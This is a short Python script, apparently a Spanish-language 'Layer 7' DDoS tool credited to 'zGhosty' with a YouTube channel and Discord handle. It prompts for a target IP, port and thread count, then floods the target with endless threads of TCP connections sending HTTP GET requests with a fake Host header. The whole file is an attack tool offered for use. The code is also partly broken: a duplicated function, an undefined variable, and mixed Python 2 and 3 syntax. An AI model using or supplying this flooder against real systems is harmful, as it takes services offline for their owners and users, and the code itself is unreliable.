import socket
import threading
import os
os.system("clear || cls")
print("""
 _______  __   __  _______  _______  _______  _______    ______   ______   _______  _______ 
|       ||  | |  ||       ||       ||       ||       |  |      | |      | |       ||       |
|    _  ||  | |  ||    _  ||    _  ||    ___||_     _|  |  _    ||  _    ||   _   ||  _____|
|   |_| ||  |_|  ||   |_| ||   |_| ||   |___   |   |    | | |   || | |   ||  | |  || |_____ 
|    ___||       ||    ___||    ___||    ___|  |   |    | |_|   || |_|   ||  |_|  ||_____  |
|   |    |       ||   |    |   |    |   |___   |   |    |       ||       ||       | _____| |
|___|    |_______||___|    |___|    |_______|  |___|    |______| |______| |_______||_______|

(Layer 7)
(Recomiendo su uso en VPS)

Author: zGhosty
Youtube: https://www.youtube.com/channel/UCNLwK1AYBdbCecYWCZuDH9g?view_as=subscriber
Discord: zGhosty#3195
""")


target = raw_input("IP: ")
fake_ip = '182.21.20.32'
port = input("PUERTO: ")
requestss = input("REQUESTS: ")
print("\n")
print("DDoSing... " +target)

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

for i in range(requestss):
    thread = threading.Thread(target=attack)
    thread.start()

attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        sent = sent + 1
        print "DDoSing... %s"%(target)
        print(attack_num)
        
        s.close()